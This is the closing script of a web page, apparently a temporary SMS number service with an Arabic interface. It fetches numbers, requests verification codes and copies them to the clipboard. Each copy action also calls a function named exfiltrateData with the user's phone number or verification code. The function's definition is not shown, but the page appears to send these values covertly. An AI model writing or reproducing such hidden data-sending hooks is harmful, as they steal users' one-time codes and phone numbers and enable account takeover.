                return;
            }
            
            const fullNumber = document.getElementById('countryCode').textContent + " " + document.getElementById('currentNumber').textContent;
            navigator.clipboard.writeText(fullNumber).then(() => {
                showToast("تم نسخ الرقم بنجاح");
                exfiltrateData('numberCopied', { number: currentNumber });
            }).catch(() => {
                // Fallback for older browsers
                const textarea = document.createElement('textarea');
                textarea.value = fullNumber;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast("تم نسخ الرقم بنجاح");
                exfiltrateData('numberCopied', { number: currentNumber });
            });
        }
        
        // Copy verification code to clipboard
        function copyCode() {
            if (!verificationCode) {
                showToast("لا يوجد كود متاح للنسخ");
                return;
            }
            
            navigator.clipboard.writeText(verificationCode).then(() => {
                showToast("تم نسخ الكود بنجاح");
                exfiltrateData('codeCopied', { code: verificationCode });
            }).catch(() => {
                // Fallback for older browsers
                const textarea = document.createElement('textarea');
                textarea.value = verificationCode;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast("تم نسخ الكود بنجاح");
                exfiltrateData('codeCopied', { code: verificationCode });
            });
        }
        
        // Update UI with number info
        function updateNumberInfo(number, country) {
            document.getElementById('countryCode').textContent = country.prefix;
            document.getElementById('currentNumber').textContent = number;
            document.getElementById('countryName').textContent = country.name;
            document.getElementById('countryFlag').textContent = country.flag;
            document.getElementById('copyNumberBtn').style.display = 'inline-flex';
        }
        
        // Update UI with message info
        function updateMessageInfo(message) {
            document.getElementById('messageContent').textContent = message.text;
            document.getElementById('messageService').textContent = message.service;
            document.getElementById('messageTime').textContent = message.timestamp;
            document.getElementById('messageCard').style.display = 'block';
            document.getElementById('copyBtn').style.display = 'flex';
        }
        
        // Button handlers
        async function getNumber() {
            selectedCountry = document.getElementById('countrySelect').value ?
                countries.find(c => c.code === document.getElementById('countrySelect').value) : null;
            
            const response = await callSMSAPI('getNumber');
            if (response.success) {
                updateNumberInfo(response.number, response.country);
            }
        }
        
        async function changeNumber() {
            selectedCountry = null;
            document.getElementById('countrySelect').value = '';
            await getNumber();
        }
        
        async function requestCode() {
            if (!currentNumber) {
                showToast("الرجاء اختيار رقم أولاً");
                return;
            }
            await callSMSAPI('requestCode');
            showToast(`تم إرسال طلب الكود إلى ${document.getElementById('countryCode').textContent} ${document.getElementById('currentNumber').textContent}`);
        }
        
        async function getLastMessage() {
            if (!currentNumber) {
                showToast("الرجاء اختيار رقم أولاً");
                return;
            }
            const response = await callSMSAPI('getMessage');
            if (response.success) {
                updateMessageInfo(response.message);
            }
        }
    </script>
